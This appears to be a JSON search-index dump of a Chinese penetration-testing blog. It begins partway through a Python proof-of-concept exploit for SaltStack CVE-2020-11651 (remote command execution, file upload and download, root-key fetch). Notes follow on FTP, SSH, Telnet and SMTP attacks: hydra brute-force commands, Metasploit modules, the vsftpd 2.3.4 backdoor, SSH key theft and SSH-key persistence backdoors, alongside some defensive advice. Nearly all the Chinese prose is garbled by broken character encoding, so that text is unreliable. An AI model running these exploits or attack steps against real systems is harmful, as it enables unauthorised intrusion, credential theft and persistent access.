dest, } try: response = channel.send(message, timeout=5) return True except: return False def log(message): if not args.quiet: print(message) if __name__==\"__main__\": warnings.filterwarnings(\"ignore\") desc = \"CVE-2020-11651 PoC\" parser = argparse.ArgumentParser(description=desc) parser.add_argument(\"--host\", \"-t\", dest=\"master_host\", metavar=('HOST'), required=True) parser.add_argument(\"--port\", \"-p\", dest=\"master_port\", metavar=('PORT'), default=\"4506\", required=False) parser.add_argument(\"--execute\", \"-e\", dest=\"command\", default=\"/bin/sh\", help=\"Command to execute. Defaul: /bin/sh\", required=False) parser.add_argument(\"--upload\", \"-u\", dest=\"upload\", nargs=2, metavar=('src', 'dest'), help=\"Upload a file\", required=False) parser.add_argument(\"--download\", \"-d\", dest=\"download\", nargs=2, metavar=('src', 'dest'), help=\"Download a file\", required=False) parser.add_argument(\"--minions\", dest=\"minions\", default=False, action=\"store_true\", help=\"Send command to all minions on master\",required=False) parser.add_argument(\"--quiet\", \"-q\", dest=\"quiet\", default=False, action=\"store_true\", help=\"Enable quiet/silent mode\", required=False) parser.add_argument(\"--fetch-key-only\", dest=\"fetchkeyonly\", default=False, action=\"store_true\", help=\"Only fetch the key\", required=False) args = parser.parse_args() minion_config = { \"transport\": \"zeromq\", \"pki_dir\": \"/tmp\", \"id\": \"root\", \"log_level\": \"debug\", \"master_ip\": args.master_host, \"master_port\": args.master_port, \"auth_timeout\": 5, \"auth_tries\": 1, \"master_uri\": f\"tcp://{args.master_host}:{args.master_port}\" } clear_channel = salt.transport.client.ReqChannel.factory(minion_config, crypt=\"clear\") log(f\"[+] Attempting to ping {args.master_host}\") if not ping(clear_cha","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:3:2","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´åˆ©ç”¨ è¯»å– root key æ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´: ç›®å½•éå† å‘½ä»¤æ‰§è¡Œ ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:3:3","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å¸¸è§æœåŠ¡ç±»æ¼æ´","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å¸¸è§æœåŠ¡ç±»æ¼æ´ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:0:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"FTP æ¼æ´ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"FTP åè®®ä»‹ç» FTPï¼ˆFile Transfer Protocolï¼Œæ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ TCP/IP åè®®ç»„ä¸­çš„åè®®ä¹‹ä¸€ã€‚FTP åè®®åŒ…æ‹¬ä¸¤ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå…¶ä¸€ä¸º FTP æœåŠ¡å™¨ï¼Œå…¶äºŒä¸º FTP å®¢æˆ·ç«¯ã€‚å…¶ä¸­ FTP æœåŠ¡å™¨ç”¨æ¥å­˜å‚¨æ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨ FTP å®¢æˆ·ç«¯é€šè¿‡ FTP åè®®è®¿é—®ä½äº FTP æœåŠ¡å™¨ä¸Šçš„èµ„æºã€‚åœ¨å¼€å‘ç½‘ç«™çš„æ—¶å€™ï¼Œé€šå¸¸åˆ©ç”¨ FTP åè®®æŠŠç½‘é¡µæˆ–ç¨‹åºä¼ åˆ° Web æœåŠ¡å™¨ä¸Šã€‚æ­¤å¤–ï¼Œç”±äº FTP ä¼ è¾“æ•ˆç‡éå¸¸é«˜ï¼Œåœ¨ç½‘ç»œä¸Šä¼ è¾“å¤§çš„æ–‡ä»¶æ—¶ï¼Œä¸€èˆ¬ä¹Ÿé‡‡ç”¨è¯¥åè®®ã€‚ é»˜è®¤æƒ…å†µä¸‹ FTP åè®®ä½¿ç”¨ TCP ç«¯å£ä¸­çš„ 20 å’Œ 21 è¿™ä¸¤ä¸ªç«¯å£ï¼Œå…¶ä¸­ 20 ç”¨äºä¼ è¾“æ•°æ®ï¼Œ21 ç”¨äºä¼ è¾“æ§åˆ¶ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œæ˜¯å¦ä½¿ç”¨ 20 ä½œä¸ºä¼ è¾“æ•°æ®çš„ç«¯å£ä¸ FTP ä½¿ç”¨çš„ä¼ è¾“æ¨¡å¼æœ‰å…³ï¼Œå¦‚æœé‡‡ç”¨ä¸»åŠ¨æ¨¡å¼ï¼Œé‚£ä¹ˆæ•°æ®ä¼ è¾“ç«¯å£å°±æ˜¯ 20ï¼›å¦‚æœé‡‡ç”¨è¢«åŠ¨æ¨¡å¼ï¼Œåˆ™å…·ä½“æœ€ç»ˆä½¿ç”¨å“ªä¸ªç«¯å£è¦æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯åå•†å†³å®šã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Banner ä¿¡æ¯ Banner ä¿¡æ¯æš´éœ²è¿œç¨‹ç³»ç»Ÿä¸Šè¿è¡Œçš„ä»»ä½•è½¯ä»¶æˆ–æœåŠ¡çš„æ¼æ´ï¼Œå› æ­¤åœ¨å®‰è£…ä»»ä½•æœåŠ¡åéœ€è¦éšè—å…¶è½¯ä»¶ç‰ˆæœ¬ã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"åŒ¿åç™»å½• anonymous login msf scanner/ftp/anonymous æ¨¡å— ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä¸­é—´äººå—…æ¢ æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å—…æ¢å·¥å…·æ¥å¸®åŠ©ä»–ä»¬å—…æ¢ç½‘ç»œä¸­æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´ä¼ è¾“çš„æ•°æ®åŒ…å¹¶æ£€ç´¢å‡­æ®ï¼Œè¿™è¢«ç§°ä¸ºå—…æ¢ï¼Œç„¶åå°†å…¶ç”¨äºæœªç»æˆæƒçš„è®¿é—®ã€‚å¦‚ä¸Šæ‰€è¿°ï¼ŒFTPç”¨æˆ·å¯ä»¥ä½¿ç”¨ç”¨äºç”¨æˆ·åå’Œå¯†ç çš„æ˜æ–‡ç™»å½•åè®®å¯¹è‡ªå·±è¿›è¡Œèº«ä»½éªŒè¯ã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:4","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"FTP æš´åŠ›ç ´è§£å·¥å…· hydra hydra -v -L user.txt -P pass.txt ftp://ip MSF auxiliary/scanner/ftp/ftp_login ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:5","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"vsftpd ç¬‘è„¸æ¼æ´ ç‰ˆæœ¬ï¼švsftp 2.3.4 åé—¨ï¼š ç”¨æˆ·åä¸­åŒ…å« :) å°±å¯ä»¥å¯ç”¨ç»‘å®šåœ¨ 6200 ç«¯å£çš„åé—¨ shell ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:6","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"é˜²å¾¡ ä¿®æ”¹é…ç½®ä¸Šçš„bannerä¿¡æ¯ åŠ  ssl è¯ä¹¦(SSL_Enable=YES) ç™½åå•é™åˆ¶ç™»å½• iptables è®¾ç½®ç™»å½•æ¬¡æ•°ä¸ç™»å½•çº¿ç¨‹ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:7","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SSH æ¼æ´ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SSH ç®€ä»‹ SSH ä¸º Secure Shell çš„ç¼©å†™ï¼Œç”± IETF çš„ç½‘ç»œå°ç»„ï¼ˆNetwork Working Groupï¼‰æ‰€åˆ¶å®šï¼›SSH ä¸ºå»ºç«‹åœ¨åº”ç”¨å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ã€‚SSH æ˜¯è¾ƒå¯é ï¼Œä¸“ä¸ºè¿œç¨‹ç™»å½•ä¼šè¯å’Œå…¶ä»–ç½‘ç»œæœåŠ¡æä¾›å®‰å…¨æ€§çš„åè®®ã€‚åˆ©ç”¨ SSH åè®®å¯ä»¥æœ‰æ•ˆé˜²æ­¢è¿œç¨‹ç®¡ç†è¿‡ç¨‹ä¸­çš„ä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚SSH æœ€åˆæ˜¯UNIXç³»ç»Ÿä¸Šçš„ä¸€ä¸ªç¨‹åºï¼Œåæ¥åˆè¿…é€Ÿæ‰©å±•åˆ°å…¶ä»–æ“ä½œå¹³å°ã€‚SSH åœ¨æ­£ç¡®ä½¿ç”¨æ—¶å¯å¼¥è¡¥ç½‘ç»œä¸­çš„æ¼æ´ã€‚SSHå®¢æˆ·ç«¯é€‚ç”¨äºå¤šç§å¹³å°ã€‚å‡ ä¹æ‰€æœ‰UNIX å¹³å°â€”åŒ…æ‹¬ HP-UXã€Linuxã€AIXã€Solarisã€Digital UNIXã€Irixï¼Œä»¥åŠå…¶ä»–å¹³å°ï¼Œéƒ½å¯è¿è¡Œ SSHã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ç«¯å£æ‰«æ nmap nmap -sV -p 22 IP msf auxiliary/scanner/ssh/ssh_version ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å¯†ç ç ´è§£ msf use auxiliary/scanner/ssh/ssh_login set stop_on_success true ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SSH ç”¨æˆ·ä»£ç æ‰§è¡Œ msf use exploit/multi/ssh/sshexec ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:4","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä½¿ç”¨ RSA å¯†é’¥å»ºç«‹ SSH è¿æ¥ é…ç½®ï¼š ssh-keygen cd /home/kali/.ssh ls cat id_rsa.pub \u003e authorized_keys scp msfadmin@ip:/home/msfadmin/.ssh/id_rsa ./ sudo vim /etc/ssh/sshd_config PasswordAuthentication no sudo /etc/init.d/ssh restart è¿æ¥ï¼š ssh -i id_rsa username@ip ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:5","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"çªƒå– SSH å¯†é’¥ å·²è·å¾— meterpreter ä¼šè¯ï¼Œçªƒå– SSH å¯†é’¥ use auxiliary/scanner/ssh/ssh_login è·å–ä¼šè¯ use post/multi/gather/ssh_creds set session 1 run ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:6","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SSH å¯†é’¥æŒä¹…æ€§åé—¨ å·²è·å¾— meterpreter ä¼šè¯ï¼Œç•™ä¸‹ SSH å¯†é’¥æŒä¹…æ€§åé—¨ use auxiliary/scanner/ssh/ssh_login è·å–ä¼šè¯ use post/linux/manager/sshkey_persistence set session 1 run ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:7","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"é˜²å¾¡ ä¿®æ”¹é»˜è®¤ç«¯å£ sudo vim /etc/ssh/sshd_config port 22222 sudo /etc/init.d/ssh restart ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:8","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Telnet æ¼æ´ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"telnet ç®€ä»‹ Telnet åè®®æ˜¯ TCP/IP åè®®æ—ä¸­çš„ä¸€å‘˜ï¼Œæ˜¯ Internet è¿œç¨‹ç™»å½•æœåŠ¡çš„æ ‡å‡†åè®®å’Œä¸»è¦æ–¹å¼ã€‚å®ƒä¸ºç”¨æˆ·æä¾›äº†åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šå®Œæˆè¿œç¨‹ä¸»æœºå·¥ä½œçš„èƒ½åŠ›ã€‚åœ¨ç»ˆç«¯ä½¿ç”¨è€…çš„ç”µè„‘ä¸Šä½¿ç”¨ telnet ç¨‹åºï¼Œç”¨å®ƒè¿æ¥åˆ°æœåŠ¡å™¨ã€‚ç»ˆç«¯ä½¿ç”¨è€…å¯ä»¥åœ¨ telnet ç¨‹åºä¸­è¾“å…¥å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤ä¼šåœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œï¼Œå°±åƒç›´æ¥åœ¨æœåŠ¡å™¨çš„æ§åˆ¶å°ä¸Šè¾“å…¥ä¸€æ ·ã€‚å¯ä»¥åœ¨æœ¬åœ°å°±èƒ½æ§åˆ¶æœåŠ¡å™¨ã€‚è¦å¼€å§‹ä¸€ä¸ª telnet ä¼šè¯ï¼Œå¿…é¡»è¾“å…¥ç”¨æˆ·åå’Œå¯†ç æ¥ç™»å½•æœåŠ¡å™¨ã€‚Telnet æ˜¯å¸¸ç”¨çš„è¿œç¨‹æ§åˆ¶ Web æœåŠ¡å™¨çš„æ–¹æ³•ã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"banner ä¿¡æ¯ /etc/issue.net msf use auxiliary/scanner/telnet/telnet_version ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä¿®æ”¹é»˜è®¤ç«¯å£ /etc/services sudo /etc/init.d/xinetd restart ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"é€šè¿‡å—…æ¢çªƒå–å‡­æ® æ˜æ–‡ä¼ è¾“ï¼Œå¯ä»¥å—…æ¢ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:4","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æš´åŠ›ç ´è§£ hydra hydra -v -L user.txt -P pass.txt telnet://IP msf use auxiliary/scanner/telnet/telnet_login set rhost set stop_on_success true set user_file user.txt set pass_file pass.txt run ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:5","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä¿æŠ¤ telnet å…å—æš´åŠ›æ”»å‡» å°†å…è®¸æ¥è‡ª IP åœ°å€ 192.168.1.1 çš„æµé‡è®¿é—®ç«¯å£ 23 ä¸Šçš„ telnet æœåŠ¡ sudo iptables -A INPUT -s 192.168.1.1 -p tcp --dport 23 -j ACCEPT drop æ‰æ¥è‡ªç«¯å£ 23 ä¸Šå…¶å®ƒ IP åœ°å€çš„æµé‡ sudo iptables -A INPUT -p tcp --dport 23 -j DROP ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:6","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SMTP æ¼æ´ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SMTP ç®€ä»‹ SMTP æ˜¯ä¸€ç§æä¾›å¯é ä¸”æœ‰æ•ˆçš„ç”µå­é‚®ä»¶ä¼ è¾“çš„åè®®ã€‚SMTP æ˜¯å»ºç«‹åœ¨ FTP æ–‡ä»¶ä¼ è¾“æœåŠ¡ä¸Šçš„ä¸€ç§é‚®ä»¶æœåŠ¡ï¼Œä¸»è¦ç”¨äºç³»ç»Ÿä¹‹é—´çš„é‚®ä»¶ä¿¡æ¯ä¼ é€’ï¼Œå¹¶æä¾›æœ‰å…³æ¥ä¿¡çš„é€šçŸ¥ã€‚SMTP ç‹¬ç«‹äºç‰¹å®šçš„ä¼ è¾“å­ç³»ç»Ÿï¼Œä¸”åªéœ€è¦å¯é æœ‰åºçš„æ•°æ®æµä¿¡é“æ”¯æŒï¼ŒSMTP çš„é‡è¦ç‰¹æ€§ä¹‹ä¸€æ˜¯å…¶èƒ½è·¨è¶Šç½‘ç»œä¼ è¾“é‚®ä»¶ï¼Œå³ SMTPé‚®ä»¶ä¸­ç»§ ã€‚ä½¿ç”¨ SMTPï¼Œå¯å®ç°ç›¸åŒç½‘ç»œå¤„ç†è¿›ç¨‹ä¹‹é—´çš„é‚®ä»¶ä¼ è¾“ï¼Œä¹Ÿå¯é€šè¿‡ä¸­ç»§å™¨æˆ–ç½‘å…³å®ç°æŸå¤„ç†è¿›ç¨‹ä¸å…¶ä»–ç½‘ç»œä¹‹é—´çš„é‚®ä»¶ä¼ è¾“ã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SMTP å‘½ä»¤å’Œè¿”å›ç  MAIL FROM æŒ‡å®šå‘ä»¶äººåœ°å€ RCPT TO æŒ‡å®šå•ä¸ªçš„é‚®ä»¶æ¥æ”¶äººï¼šå¯èƒ½æœ‰å¤šä¸ª RCPT 